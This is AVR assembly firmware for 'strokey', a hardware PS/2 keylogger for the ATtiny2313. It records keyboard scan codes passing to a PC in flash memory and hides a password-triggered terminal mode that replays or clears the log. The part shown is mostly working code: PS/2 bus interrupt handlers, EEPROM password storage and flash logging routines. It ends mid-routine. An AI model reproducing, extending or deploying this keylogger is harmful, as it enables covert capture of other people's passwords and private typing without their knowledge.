;************************************************************************************************
;*
;* title:     strokey
;* file:      main.asm
;* version:   2.0 (03/30/2006)
;* creation:  01/18/2006
;* author:    wiRe (wiRe _at_ gmx _dot_ net)
;*
;* target:    ATtiny2313
;* compiler:  Atmel AVR Assembler
;*
;* copyright (c) 2005-2008 wiRe
;*
;************************************************************************************************
;*
;* LICENSE
;*
;* see "license.txt"
;*
;************************************************************************************************
;*
;* DESCRIPTION
;*
;* in slave mode, communication between ps2 keyboard and pc get's listened
;* while logging the scan codes using three different log-modes. some
;* configurable key-sequence (the password) can turn the device into
;* master/terminal mode. then it will execute typed commands like a shell.
;* the command gets sent by hitting the return key. after the exit command
;* was entered or escape was pressed, the device switches back to slave mode.
;*
;* known commands
;* +-----------------------------------+----------------+
;* | display command help              | 'help'         |
;* | display status (last error)       | 'stat'         |
;* | change password                   | 'pwd'          |
;* +-----------------------------------+----------------+
;* | stop logging                      | 'stp'          |
;* | start logging                     | 'log'          |
;* | start timed logging               | 'lgt'          |
;* | log only after power-on           | 'lgs'          |
;* +-----------------------------------+----------------+
;* | query log                         | 'qer'          |
;* | clear log and last error          | 'clr'          |
;* +-----------------------------------+----------------+
;* | perform flash memory test         | 'memtest'      |
;* +-----------------------------------+----------------+
;* | set device back to slave mode     | 'exit','',ESC  |
;* +-----------------------------------+----------------+
;* | enter terminal mode directly      | JMP1           |
;* | swap character (Z <-> Y)          | JMP2           |
;* +-----------------------------------+----------------+
;*
;************************************************************************************************
;*
;* CHIP CONFIGURATION
;*
;* clock:     int. osc (8 MHz)
;* startup:   14CK (+ 4.1ms)
;* BOD level: 4.3V
;* SPIEN:     set
;*
;* unset all other fuses
;*
;************************************************************************************************
.device ATtiny2313


;************************************************************************************************
;*
;* INCLUDES
;*
;************************************************************************************************
.include "tn2313def.inc"
.include "regdef.inc"
.include "keymap_de.inc"
;.include "keymap_en.inc"
.include "equates.inc"

;.include "board_test.inc"
;.include "board_v1.inc"
.include "board_v2.inc"

.include "debug.inc"




;************************************************************************************************
;*
;* MACROS
;*
;************************************************************************************************
.macro  				ldx                           ;load X pointer
        				ldi		xl, low (@0)
        				ldi   xh, high(@0)
.endm

.macro  				ldy                           ;load Y pointer
        				ldi		yl, low (@0)
        				ldi   yh, high(@0)
.endm

.macro  				ldz                           ;load Z pointer
        				ldi		zl, low (@0)
        				ldi   zh, high(@0)
.endm




;************************************************************************************************
;*
;* INTERRUPT TABLE
;*
;************************************************************************************************
.CSEG
                .org  0                       ;interrupt handler table
reset:  				rjmp	INIT                		;0x00: reset handler
                reti                          ;0x01: external interrupt 0 handler
                reti                          ;0x02: external interrupt 1 handler
                reti                          ;0x03: timer1 capture handler
                reti                          ;0x04: timer1 compare A handler
                reti                          ;0x05: timer1 overflow handler
                reti                          ;0x06: timer0 overflow handler
                reti                          ;0x07: USART0 RX complete handler
                reti                          ;0x08: USART0 UDR empty handler
                reti                          ;0x09: USART0 TX complete handler
                reti                          ;0x0A: analog comperator handler
                rjmp  pin_chng_int            ;0x0B: pin change interrupt
                reti                          ;0x0C: timer1 compare B handler
                rjmp  timer0A_int             ;0x0D: timer0 compare A handler
                reti                          ;0x0E: timer0 compare B handler
                reti                          ;0x0F: USI start handler
                reti                          ;0x10: USI overflow handler
                reti                          ;0x11: EEPROM ready handler
                rjmp  watchdog_int            ;0x12: watchdog overflow handler




;************************************************************************************************
;*
;* INCLUDE EXTERNAL CODE FILES
;*
;************************************************************************************************
.include "debug.asm"

.ifdef FLASH_SST49LF020
  .include "SST49LF020.asm"
.endif

.ifdef FLASH_AT45DB081B
  .include "AT45DB081B.asm"
.endif




;************************************************************************************************
;*
;* EEPROM SEGMENT
;*
;************************************************************************************************
.ESEG

ee_data_start:                                ;start of our eeprom data
ee_error_code:  .db   ERROR_SUCCESS           ;holds the last error code
ee_log_mode:    .db   LOGMODE_STP             ;holds the actual log mode

ee_pwd_buf:     .db   KEYC_S, KEYC_K          ;the initial password stored on the eeprom
                .byte INPUT_BUF_SIZE-2
ee_pwd_buf_len: .db   2
ee_data_end:                                  ;end of our eeprom data

.equ EE_DATA_SIZE = ee_data_end - ee_data_start




;************************************************************************************************
;*
;* DATA SEGMENT
;*
;************************************************************************************************
.DSEG

shadow_start:                                 ;start of eeprom data shadow memory space (ee_data_start)
error_code:     .byte 1                       ;holds the last error code
log_mode:       .byte 1                       ;holds the actual log mode
pwd_buf:        .byte INPUT_BUF_SIZE          ;equivalent to input_buffer,
pwd_buf_len:    .byte 1                       ;  but contains the password from eeprom
shadow_end:                                   ;end of eeprom data shadow memory space (ee_data_end)

.equ EE_SHADOW_SIZE = shadow_end - shadow_start

.if (EE_DATA_SIZE != EE_SHADOW_SIZE)
  .message "error: shadow memory has different size than eeprom data"
.endif


ps2rx_buf:      .byte PS2RX_BUF_SIZE          ;ring buffer, containing received keycodes
ps2rx_buf_in:   .byte 1                       ;index of the last byte written
ps2rx_buf_out:  .byte 1                       ;index of the next byte to read
                                              ;in == out? -> buffer empty
.if (ps2rx_buf > (256 - PS2RX_BUF_SIZE))      ;(in+1)&(PS2RX_BUF_SIZE-1) == out? -> buffer full
  .message "error: address of ps2rx_buf is too large"
.endif

ps2rx_status:   .byte 1                       ;the current Rx status

keyc_skip_cntr: .byte 1                       ;helps skipping of extended keys or breakcodes

log_timer:      .byte 1                       ;logging timer, decrements every second until zero
log_cntr:       .byte 1                       ;logging counter, counts the logged characters

input_buf_len:  .byte 1                       ;size of input buffer
input_buf:      .byte INPUT_BUF_SIZE          ;input buffer
                                              ;the input buf contains only single-byte keycodes
                                              ;break-codes (0xFE)
                                              ;or extended keycodes (0xE0,0xE1) get skipped




;************************************************************************************************
;*
;* CODE SEGMENT
;*
;************************************************************************************************
.CSEG


;************************************************************************************************
;*
;* FUNCTION     error
;* DESCRIPTION  set error code (callable from interrupts)
;* INPUT        at = error code
;* WASTE        at
;*
;************************************************************************************************
error:          push  t0                      ;store t0
                in    t0, SREG                ;store status register
                cli                           ;disable interrupts
error_lp:       sbic  EECR, EEPE              ;wait until last write finishs
                rjmp  error_lp                ;
                mov   zero, at                ;we could missuse zero because int's are disabled
                ldi   at, ee_error_code       ;write address
                out   EEAR, at                ;
                sbi   EECR, EERE              ;read
                in    at, EEDR                ;
                cpi   at, ERROR_SUCCESS       ;contains error already?
                brne  error_skpwr             ;  yes -> skip writing
                out   EEDR, zero              ;write data
                sbi   EECR, EEMPE             ;start writing
                sbi   EECR, EEPE              ;
error_skpwr:    clr   zero                    ;restore zero
                out   SREG, t0                ;restore status register
                pop   t0                      ;restore t0
                ret                           ;return


;************************************************************************************************
;*
;* FUNCTION     eeprom_init (do not call from interrupts)
;* INPUT        a0 = address to write into EEAR
;* WASTE        flags (disables interrupts)
;*
;************************************************************************************************
eeprom_init_r:  sei
eeprom_init:    sbic  EECR, EEPE
                rjmp  eeprom_init
                cli
                sbic  EECR, EEPE
                rjmp  eeprom_init_r
                out   EEAR, a0
                ret


;************************************************************************************************
;*
;* FUNCTION     eeprom_read (do not call from interrupts)
;* INPUT        a0 = address
;* OUTPUT       v0 = value
;* WASTE        flags, v0
;*
;************************************************************************************************
eeprom_read:    rcall eeprom_init
                sbi   EECR, EERE
                in    v0, EEDR
eeprom_ret:     sei
                ret


;************************************************************************************************
;*
;* FUNCTION     eeprom_write (do not call from interrupts, only writes changes)
;* INPUT        a0 = address, a1 = data
;* WASTE        flags, at
;*
;************************************************************************************************
eeprom_write:   rcall eeprom_init
                sbi   EECR, EERE
                in    at, EEDR
                cp    at, a1
                breq  eeprom_ret
                out   EEDR, a1
                sbi   EECR, EEMPE
                sbi   EECR, EEPE
                rjmp  eeprom_ret


;************************************************************************************************
;*
;* FUNCTION     read_shadow
;* DESCRIPTION  read eeprom data (ee_data_start) into shadow memory (shadow_start)
;* WASTE        flags, a0, v0, z
;*
;************************************************************************************************
read_shadow:    ldi   a0, ee_data_start
                ldz   shadow_start
read_shadow_lp: rcall eeprom_read
                st    z+, v0
                inc   a0
                cpi   a0, ee_data_end
                brlo  read_shadow_lp
                ret


;************************************************************************************************
;*
;* FUNCTION     delay
;* INPUT        a0 = time in ms
;* WASTE        flags, at, a0, time
;*
;************************************************************************************************
delay250:       ldi   a0, 250
delay:        	ldi  	at, (XTAL+767)/768
delay_lp:				dec		zero
        				brne	delay_lp
        				dec   at
        				brne  delay_lp
        				dec   a0
        				brne  delay
        				ret


;************************************************************************************************
;*
;* FUNCTION     beep
;* DESCRIPTION  init timer 1B CTC, toggles OC1B pin (SPeaKer pin)
;* INPUT        a0 = time in ms
;*              a1 = LOW(XTAL*1000 /[Hz])
;*              a2 = HIGH(XTAL*1000/[Hz])
;*                                  [Hz] = [32..~]
;* WASTE        flags, at, a0, time
;*
;************************************************************************************************
beep:           out   OCR1BH, a2              ;compare b, high byte
                out   OCR1AH, a2              ;compare a, high byte
                out   OCR1BL, a1              ;compare b, low byte
                out   OCR1AL, a1              ;compare a, low byte
                out   TCNT1H, zero            ;reset cntr
                out   TCNT1L, zero            ;
                ldi   at, 0b00010000          ;OC1B toggle, CTC
                out   TCCR1A, at              ;
                ldi   at, 0b00001001          ;CTC, CLKi/o / 1
                out   TCCR1B, at              ;
                rcall delay                   ;delay(a0)
                out   TCCR1B, zero            ;no clock
                ret


;************************************************************************************************
;*
;* FUNCTION     beep_hi
;* DESCRIPTION  output: 1000 Hz, 75ms
;* WASTE        flags, at, a0..a2, time
;*
;************************************************************************************************
beep_hi:        ldi   a0, 75
                ldi   a1, LOW(XTAL*1000/1000)
                ldi   a2, HIGH(XTAL*1000/1000)
                rjmp  beep


;************************************************************************************************
;*
;* FUNCTION     beep_hi
;* DESCRIPTION  output: 500 Hz, 75ms
;* WASTE        flags, at, a0..a2, time
;*
;************************************************************************************************
beep_lo:        ldi   a0, 75
                ldi   a1, LOW(XTAL*1000/500)
                ldi   a2, HIGH(XTAL*1000/500)
                rjmp  beep






;************************************************************************************************
;*
;* FUNCTION     timer0A_int (interrupt handler) - gets called every 20us, clocks the data to host
;*
;************************************************************************************************
timer0A_int:    in    ss, SREG                ;enter interrupt, store registers
        				cli                           ;
                mov   sat, at                 ;
                mov   s0, t0                  ;

                mov   t0, ps2tx_status
                cpi   t0, PS2TX_STATUS_IDLE   ;idle?
                breq  timer0A_iret            ;  yes -> return from interrupt

                                              ;only support for PS2TX_STATUS_TxD2H transfer
                andi  t0, PS2TX_STATUS_MASK   ;get counter from status register
                lsr   t0                      ;divide by two and shift LSB into carry, set?
                brcs  timer0A_inc             ;  yes -> skip clock, update status and return
                sbrs  t0, 0                   ;LSB set?
                rjmp  timer0A_high            ;  no -> output high clock
                                              ;  yes -> output low clock

timer0A_low:   ;cpi   t0, 10*2                ;beneath the 10th clock cycle?
               ;brsh  timer0A_noterm          ;  yes -> transfer couldnt get terminated
                sbis  PS2O_PIN, PS2O_CLK      ;terminate transfer, PS2O_CLK low?
                rjmp  timer0A_reset           ;  yes -> reset transfer
timer0A_noterm: sbi   PS2O_DDR, PS2O_CLK      ;set PS2O_CLK to output
                cbi   PS2O_PORT, PS2O_CLK     ;  and write a low signal
                rjmp  timer0A_inc             ;update status and return


timer0A_high:   cbi   PS2O_DDR, PS2O_CLK      ;set PS2O_CLK to input
                sbi   PS2O_PORT, PS2O_CLK     ;  and enable pullup

                                              ;now update data line...
                cpi   t0, 0*2                 ;send startbit?
                breq  timer0A_data0           ;  yes -> set data low, update status and return

                cpi   t0, 9*2                 ;send data bits?
                brsh  timer0A_skp18           ;  no -> skip
                lsr   ps2tx_data              ;shift LSB into carry
                brcc  timer0A_data0           ;carry set?
                inc   ps2tx_parity            ;  yes -> count parity

timer0A_data1:  cbi   PS2O_DDR, PS2O_DATA     ;set PS2O_DATA to input
                sbi   PS2O_PORT, PS2O_DATA    ;  and enable pullup
                rjmp  timer0A_inc             ;update status and return

timer0A_data0:  sbi   PS2O_DDR, PS2O_DATA     ;set PS2O_DATA to output
                cbi   PS2O_PORT, PS2O_DATA    ;  and write a low signal
                rjmp  timer0A_inc             ;update status and return

timer0A_skp18:  cpi   t0, 10*2                ;send parity bit?
                brsh  timer0A_skp20           ;  no -> skip
                sbrc  ps2tx_parity, 0         ;parity even?
                rjmp  timer0A_data0           ;  no -> write low signal
                rjmp  timer0A_data1           ;  yes -> write high signal

timer0A_skp20:  cpi   t0, 11*2                ;send stop bit?
                brlo  timer0A_data1           ;  yes -> set data high, update status and return

                ldi   at, PS2TX_STATUS_IDLE   ;transfer finished
                mov   ps2tx_status, at        ;
                rjmp  timer0A_iret            ;return

timer0A_reset:  mov   ps2tx_data, ps2tx_rdata ;reset transfer
                mov   ps2tx_parity, zero      ;
                ldi   at, PS2TX_STATUS_TxD2H  ;
                mov   ps2tx_status, at        ;
                rjmp  timer0A_iret            ;return

timer0A_inc:    inc   ps2tx_status            ;increment status
timer0A_iret:   mov   t0, s0                  ;leave interrupt, restore registers
                mov   at, sat                 ;
                out   SREG, ss                ;
                reti                          ;




;************************************************************************************************
;*
;* FUNCTION     pin_chng_int (interrupt handler) - gets called on every pin change of PS2I_CLK
;*
;************************************************************************************************
pin_chng_int:   in    ss, SREG                ;enter interrupt, store registers
        				cli                           ;
                mov   sat, at                 ;
                mov   s0, t0                  ;

                in    t0, PS2I_PIN            ;read whole input port to t0

                lds   at, ps2rx_status        ;load machine status
                cpi   at, PS2RX_STATUS_IDLE   ;idle?
                breq  pin_chng_idle           ;  yes -> ...
                cpi   at, PS2RX_STATUS_TxD2H  ;device2host transfer?
                breq  pin_chng_td2h           ;  yes -> ...
                rjmp  pin_chng_th2d


pin_chng_idle:  ;no transfer (idle)
                sbrc  t0, PS2I_CLK            ;clock low?
                rjmp  pin_chng_idle1          ;  no -> ...

pin_chng_idle0: sbrc  t0, PS2I_DATA           ;clock low, data low?
                rjmp  pin_chng_iret           ;  no -> return

                ldi   at, HIGH(1<<9)          ;init high shift buffer (10 bits)
                mov   ps2rx_shft_h, at        ;
                mov   ps2rx_shft_l, zero      ;init low shift buffer
                mov   ps2rx_parity, zero      ;init parity bit counter
                ldi   at, PS2RX_STATUS_TxD2H  ;change state to TxD2H
                rjmp  pin_chng_upd            ;update state and return

pin_chng_idle1: sbrc  t0, PS2I_DATA           ;clock high, data low?
                rjmp  pin_chng_iret           ;  no -> return

                ldi   at, HIGH(1<<9)          ;init high shift buffer (10 bits)
                mov   ps2rx_shft_h, at        ;
                mov   ps2rx_shft_l, zero      ;init low shift buffer
                mov   ps2rx_parity, zero      ;init parity bit counter
                ldi   at, PS2RX_STATUS_TxH2D_A;change state to TxH2D_A
                rjmp  pin_chng_upd            ;update state and return


pin_chng_td2h:  ;device to host transfer
                ;receive 1 byte (LSB-first), 1 parity- and 1 stop-bit
                ;read bit on every low clk
                sbrc  t0, PS2I_CLK            ;clk low?
                rjmp  pin_chng_iret           ;  no -> return

                sbrc  t0, PS2I_DATA           ;update parity bit counter
                inc   ps2rx_parity            ;

                ldi   at, HIGH(1<<10)         ;read data bit into shift register
                sbrc  t0, PS2I_DATA           ;
                or    ps2rx_shft_h, at        ;
                lsr   ps2rx_shft_h            ;shift byte
                ror   ps2rx_shft_l            ;shift carry bit in
                brcc  pin_chng_iret           ;LSB was set? no -> return

                ;transfer finished
                ldi   at, PS2RX_STATUS_IDLE   ;switch back to idle state
                sbrs  t0, PS2I_DATA           ;valid stopbit (high)?
                rjmp  pin_chng_upd            ;  no -> update state and return
                sbrc  ps2rx_parity, 0         ;even parity? (parity- and stopbit included)
                rjmp  pin_chng_upd            ;  no -> update state and return
                sts   ps2rx_status, at        ;update state

                ;store ps2rx_shft_l into Rx buffer
                mov   s1, zl                  ;store zl
                mov   s2, zh                  ;store zh

                lds   t0, ps2rx_buf_in        ;load Rx buffer indices
                lds   at, ps2rx_buf_out       ;
                ldz   ps2rx_buf               ;load z
                add   zl, t0                  ;  (only 8bit address)
                inc   t0                      ;calculate next index
                andi  t0, PS2RX_BUF_SIZE-1    ;
                cp    t0, at                  ;equal indices?
                breq  pin_chng_td2ho          ;  yes -> buffer overflow

                st    z, ps2rx_shft_l         ;store new keycode
                sts   ps2rx_buf_in, t0        ;store index
pin_chng_td2r:  mov   zh, s2                  ;restore zh
                mov   zl, s1                  ;restore zl
                rjmp  pin_chng_iret           ;return

pin_chng_td2ho: dbg_beep                      ;debug beep on buffer overflow
                ldi   at, ERROR_INPUT_OVRFLW  ;set error code
                rcall error                   ;
                rjmp  pin_chng_td2r           ;return


;------------------------------------------------------------------------------------------------
pin_chng_th2d:  cpi   at, PS2RX_STATUS_TxH2D_A  ;host2device transfer?
                breq  pin_chng_th2da            ;  yes -> ...
                cpi   at, PS2RX_STATUS_TxH2D_B  ;host2device transfer?
                breq  pin_chng_th2db            ;  yes -> ...
                cpi   at, PS2RX_STATUS_TxH2D_C  ;host2device transfer?
                brne  pin_chng_iret             ;  no -> return
                rjmp  pin_chng_th2dc            ;

pin_chng_upd:   sts   ps2rx_status, at          ;update state
pin_chng_iret:  mov   t0, s0                    ;leave interrupt, restore registers
                mov   at, sat                   ;
                out   SREG, ss                  ;
                reti                            ;
;------------------------------------------------------------------------------------------------


pin_chng_th2da: ;host to device transfer
                ;receive 1 byte (LSB-first), 1 parity- and 1 stop-bit
                ;read bit on every high clk
                sbrs  t0, PS2I_CLK            ;clk high?
                rjmp  pin_chng_iret           ;  no -> return

                sbrc  t0, PS2I_DATA           ;update parity bit counter
                inc   ps2rx_parity            ;

                ldi   at, HIGH(1<<10)         ;read data bit into shift register
                sbrc  t0, PS2I_DATA           ;
                or    ps2rx_shft_h, at        ;
                lsr   ps2rx_shft_h            ;shift byte
                ror   ps2rx_shft_l            ;shift carry bit in
                brcc  pin_chng_iret           ;LSB was set? no -> return

                ;10 bit transfer finished
                ldi   at, PS2RX_STATUS_TxH2D_C;state on valid stopbit
                sbrc  t0, PS2I_DATA           ;valid stopbit (high)?
                rjmp  pin_chng_upd            ;  yes -> update state and return

                ldi   at, 0xFF                ;received data is invalid
                mov   ps2rx_parity, at        ;set invalid parity
                ldi   at, PS2RX_STATUS_TxH2D_B;switch state
                rjmp  pin_chng_upd            ;update state and return

pin_chng_th2db: ;invalid stopbit
                ;break on next possible one
                sbrs  t0, PS2I_CLK            ;clk high?
                rjmp  pin_chng_iret           ;  no -> return
                sbrs  t0, PS2I_DATA           ;data high?
                rjmp  pin_chng_iret           ;  no -> return
                ldi   at, PS2RX_STATUS_TxH2D_C;switch to next state
                rjmp  pin_chng_upd            ;update state and return

pin_chng_th2dc: ;receive ACK signal during low clk
                ldi   at, PS2RX_STATUS_IDLE   ;idle state
                sbrc  t0, PS2I_CLK            ;clk low?
                rjmp  pin_chng_upd            ;  no -> update state and return

                sbrc  t0, PS2I_DATA           ;valid ack signal?
                rjmp  pin_chng_iret           ;  no -> return
                sbrc  ps2rx_parity, 0         ;even parity? (including parity- and stopbit)
                rjmp  pin_chng_iret           ;  no -> return

                ;this commands get ignored
               ;mov   t0, ps2rx_shft_l
                rjmp  pin_chng_iret           ;return




;************************************************************************************************
;*
;* FUNCTION     watchdog_int (interrupt handler) - gets called every 8s of idle time
;*
;************************************************************************************************
watchdog_int:   in    ss, SREG                ;enter interrupt, store registers
        				cli                           ;
                mov   sat, at                 ;

                lds   at, log_timer           ;decrement logging timer
                cp    at, zero                ;already zero?
                breq  watchdog_iret           ;  yes -> return
                dec   at                      ;  no -> decrement
                sts   log_timer, at           ;        and store new value

                .if DEBUG                     ;visualize wd-counter in debug mode
                  push  a0
                  push  a1
                  push  a2
                  rcall beep_lo
                  pop   a2
                  pop   a1
                  pop   a0

                  cpi   at, 0
                  brne  watchdog_iret
                  push  a0
                  push  a1
                  push  a2
                  rcall beep_hi
                  pop   a2
                  pop   a1
                  pop   a0
                .endif

watchdog_iret:  mov   at, sat                 ;restore registers and return from interrupt
                out   SREG, ss                ;
                reti                          ;






;************************************************************************************************
;*
;* FUNCTION     ps2rx_sleep, ps2rx_getch
;* DESCRIPTION  wait until value available before poping it from Rx buffer (sleeper)
;* RESULT       v0 = keycode
;* WASTE        flags, at, v0, z
;*
;************************************************************************************************
ps2rx_sleep:    sleep                         ;sleep until some PCInt occurs
ps2rx_getch:    lds   at, ps2rx_buf_out       ;is Rx buffer empty?
                lds   zl, ps2rx_buf_in        ;
                cp    at, zl                  ;
                brne  ps2rx_getch_ss          ;
                rjmp  ps2rx_sleep             ; yes -> repeat, until we got some data to process

ps2rx_getch_ss: ldz   ps2rx_buf               ;load z
                add   zl, at                  ;  (only 8bit address)
                ld    v0, z                   ;load value
                inc   at                      ;increment index
                andi  at, PS2RX_BUF_SIZE-1    ;
                sts   ps2rx_buf_out, at       ;store new index
                ret                           ;return




;************************************************************************************************
;*
;* FUNCTION     tx_send
;* DESCRIPTION  wait until Tx buffers are free, then start sending the keycode to the host
;* INPUT        a0 = keycode
;* WASTE        flags, at
;*
;************************************************************************************************
tx_send:        mov   at, ps2tx_status        ;wait until any pending Tx is completed
                cpi   at, PS2TX_STATUS_IDLE   ;
                brne  tx_send                 ;

                mov   ps2tx_data, a0          ;start transfer
                mov   ps2tx_rdata, a0         ;
                mov   ps2tx_parity, zero      ;
                ldi   at, PS2TX_STATUS_TxD2H  ;
                mov   ps2tx_status, at        ;
tx_send_ret:    ret


;************************************************************************************************
;*
;* FUNCTION     tx_send_key
;* DESCRIPTION  send keycode followed by its breakcode
;* INPUT        a0 = keycode
;* WASTE        flags, at, t0
;*
;************************************************************************************************
tx_send_key_ret:ldi   a0, KEYC_RET
tx_send_key:    rcall tx_send                 ;send keycode
                mov   t0, a0                  ;backup keycode
                ldi   a0, KEYC_BREAK          ;send breakcode
                rcall tx_send                 ;
                mov   a0, t0                  ;restore keycode
                rjmp  tx_send                 ;send keycode and return


;************************************************************************************************
;*
;* FUNCTION     tx_send_seq
;* DESCRIPTION  sends sequence of keycodes, located inside program memory (CSEG)
;* INPUT        z -> zero terminated buffer
;* WASTE        flags, at, t0, a0, z
;*
;************************************************************************************************
/*
tx_send_seq:    lpm   a0, z+
                tst   a0
                breq  tx_send_ret
  
               ;sbic  JMP2_PIN, JMP2          ;JMP2 set?
               ;rjmp  tx_ss_nz                ;  no -> dont swap Z/Y

               ;cpi   a0, KEYC_Y              ;y keycode?
               ;brne  tx_ss_ny                ;  no -> skip
               ;ldi   a0, KEYC_Z              ;  yes -> change to z
               ;rjmp  tx_ss_nz                ;
tx_ss_ny:      ;cpi   a0, KEYC_Z              ;z keycode?
               ;brne  tx_ss_nz                ;  no -> skip
               ;ldi   a0, KEYC_Y              ;  yes -> change to y
tx_ss_nz:
                rcall tx_send_key
                rjmp  tx_send_seq
*/


;************************************************************************************************
;*
;* FUNCTION     tx_send_seq_ee
;* DESCRIPTION  sends sequence of keycodes, located inside eeprom (ESEG)
;* INPUT        zl -> address inside ESEG
;* WASTE        flags, at, v0, t0, a0, zl
;*
;************************************************************************************************
tx_send_seq_ee: mov   a0, zl
                rcall eeprom_read
                tst   v0
                breq  tx_send_ret
  
               ;sbic  JMP2_PIN, JMP2          ;JMP2 set?
               ;rjmp  tx_ssee_nz              ;  no -> dont swap Z/Y

               ;cpi   v0, KEYC_Y              ;y keycode?
               ;brne  tx_ssee_ny              ;  no -> skip
               ;ldi   v0, KEYC_Z              ;  yes -> change to z
               ;rjmp  tx_ssee_nz              ;
tx_ssee_ny:    ;cpi   v0, KEYC_Z              ;z keycode?
               ;brne  tx_ssee_nz              ;  no -> skip
               ;ldi   v0, KEYC_Y              ;  yes -> change to y
tx_ssee_nz:
                mov   a0, v0
                rcall tx_send_key
                inc   zl
                rjmp  tx_send_seq_ee


;************************************************************************************************
;*
;* FUNCTION     tx_send_num
;* DESCRIPTION  send byte encoded as a 2 digit hexadecimal number
;* INPUT        a0 = number
;* WASTE        flags, a0, t0, t1, z
;*
;************************************************************************************************
tx_send_num:    ldz   number_lookup*2
                mov   t1, a0
                swap  a0
                andi  a0, 15
                add   zl, a0
                adc   zh, zero
                lpm   a0, z
                rcall tx_send_key

                ldz   number_lookup*2
                andi  t1, 15
                add   zl, t1
                adc   zh, zero
                lpm   a0, z
                rjmp  tx_send_key




;************************************************************************************************
;*
;* FUNCTION     log_putc
;* DESCRIPTION  write the byte inside a0 unchanged to flash and increment address
;* INPUT        a0 = byte to log (0x00..0xFE)
;* OUTPUT       v0 = newly programmed content
;* WASTE        flags, at, v0, t0..t2, yl, x
;*
;************************************************************************************************
log_putc:       mov   at, flash_addr_c        ;log char, flash full?
                cpi   at, LOW(FLASH_SIZE>>16) ;
                brlo  log_putc_prog           ;  no -> program
                mov   at, flash_addr_b        ;
                cpi   at, LOW(FLASH_SIZE>>8)  ;
                brlo  log_putc_prog           ;  no -> program
                mov   at, flash_addr_a        ;
                cpi   at, LOW(FLASH_SIZE)     ;
                brlo  log_putc_prog           ;  no -> program

                ldi   at, ERROR_FLASH_OVRFLW  ;  yes -> set flash overflow error
                mov   v0, a0                  ;         return success, we already set error
                rjmp  error                   ;         and return

log_putc_prog:  rcall flash_prog              ;program byte (a0) and return new content (v0)

                sec                           ;increment address
                adc   flash_addr_a, zero      ;
                adc   flash_addr_b, zero      ;
                adc   flash_addr_c, zero      ;

                cp    v0, a0                  ;verify result of program, success?
                brne  log_putc_error          ;  no -> return error

               .ifdef FLASH_FLUSH
                lds   at, ps2rx_buf_out       ;is Rx buffer empty (got last keycode before sleep)?
                lds   t0, ps2rx_buf_in        ;
                cp    at, t0                  ;
                brne  log_key_ret             ;  no -> return
log_putc_flush: ldi   a0, FLASH_FLUSH         ;  yes -> perform a flash flush
                rcall flash_prog              ;
                cp    v0, a0                  ;         verify result of program, success?
                breq  log_key_ret             ;           yes -> return
               .else
                ret                           ;otherwise we simply return
               .endif

log_putc_error: ldi   at, ERROR_FLASH_VERIFY  ;set error value
                rjmp  error                   ;  and return


;************************************************************************************************
;*
;* FUNCTION     log_key
;* DESCRIPTION  log the keycode inside a0
;* INPUT        a0 = byte to log
;* WASTE        flags, at, v0, t0..t2, a0, yl, x
;*
;************************************************************************************************
log_key:        lds   at, log_mode            ;verify logging mode
                cpi   at, LOGMODE_STP         ;stopped?
                breq  log_key_ret             ;  yes -> skip logging
                
                cpi   a0, LOGID_ERROR         ;does keycode conflicts with ids?
                brlo  log_key_keep            ;  no -> keep it
                ldi   a0, LOGID_ERROR         ;  yes -> change it into error id
log_key_keep: 
                cpi   at, LOGMODE_LOG         ;usual logging mode?
                breq  log_putc                ;  yes -> log all bytes
                                              ;  no -> special logging modes...

                lds   at, log_cntr            ;current sequence finished?
                cpi   at, LOG_SEQ_LENGTH      ;
                brlo  log_key_inc             ;  no -> increment cntr and log char

                lds   at, log_timer           ;has timer finished (counts down every second)?
                cp    at, zero                ;
                brne  log_key_wdr             ;  no -> reset timer and return

                push  a0                      ;we woke up from idle time, write id to flash
                ldi   a0, LOGID_AWAKE         ;
                rcall log_putc                ;
                pop   a0                      ;
                clr   at                      ;zero counter

log_key_inc:    inc   at                      ;increment counter
                sts   log_cntr, at            ;
                rcall log_putc                ;write a0 to flash
log_key_wdr:    wdr                           ;reset watchdog timer
                ldi   at, LOG_IDLE_TIME       ;  and logging timer
                sts   log_timer, at           ;
log_key_ret:    ret                           ;before we return


;************************************************************************************************
;*
;* FUNCTION     log_clear
;* DESCRIPTION  clears the whole flash and reset pointer (needs tx_send_key for output)
;* WASTE        everything
;*
;************************************************************************************************
log_clear:      ldz   0                       ;erase all blocks
log_clear_lp:   rcall flash_erase
                ldi   a0, KEYC_DOT
                cpi   v0, 0xFF
                breq  log_clear_ok
                ldi   a0, KEYC_E
log_clear_ok:   rcall tx_send_key
                adiw  zh:zl, 1
                cpi   zh, HIGH(FLASH_NUM_BLOCKS)
                brlo  log_clear_lp
                cpi   zl, LOW(FLASH_NUM_BLOCKS)
                brlo  log_clear_lp

               ;rcall flash_get_size          ;determine new flash size
                clr   flash_addr_a
                clr   flash_addr_b
                clr   flash_addr_c
                rjmp  tx_send_key_ret         ;insert return and return




;************************************************************************************************
;*
;* FUNCTION     get_input
;* DESCRIPTION  process keycodes from Rx buffer and update the input buffer
;*              the input buffer is the actually entered string, only containing: a..z, 0..9
;*              supported control keys are: ESC (clears the buffer) and RETURN (process input)
;* INPUT        a0 = keycode
;* RETURN       carry set -> key code accepted, otherwise ignored
;*              zero set -> enter-key was pressed
;* WASTE        flags, at, z (a0 = KEYC_ESC -> KEYC_RET)
;*
;************************************************************************************************
get_input:      clr   at
                cpi   a0, KEYC_BREAK          ;received breakcode?
                breq  get_input_s1            ;  yes -> skip next byte
                cpi   a0, KEYC_EXT0           ;received extended-0 keycode?
                breq  get_input_s1            ;  yes -> skip next byte
                cpi   a0, KEYC_EXT1           ;received extended-1 keycode?
                breq  get_input_s2            ;  yes -> skip next two bytes

                lds   at, keyc_skip_cntr      ;load skip counter
                dec   at                      ;decrement, negative?
                brpl  get_input_su            ;  no -> skip and decrement

                lds   at, input_buf_len       ;load input buffer length

                cpi   a0, KEYC_RET            ;special keys
                breq  get_input_entr          ;
                cpi   a0, KEYC_BKSP           ;
                breq  get_input_bksp          ;
                cpi   a0, KEYC_ESC            ;
                breq  get_input_esc           ;

                cpi   at, INPUT_BUF_SIZE      ;input buffer full?
                brsh  get_input_sk            ;  yes -> skip this character

                                              ;test keycodes out of range
              /*.ifdef KEYC_APOSTROPH         ;
                  cpi   a0, KEYC_APOSTROPH    ;
                  breq  get_input_ok          ;
                .endif                        ;
                .ifdef KEYC_BBRK_OP           ;
                  cpi   a0, KEYC_BBRK_OP      ;
                  breq  get_input_ok          ;
                .endif                        ;
                .ifdef KEYC_EQUAL             ;
                  cpi   a0, KEYC_EQUAL        ;
                  breq  get_input_ok          ;
                .endif                        ;
                .ifdef KEYC_BBRK_CL           ;
                  cpi   a0, KEYC_BBRK_CL      ;
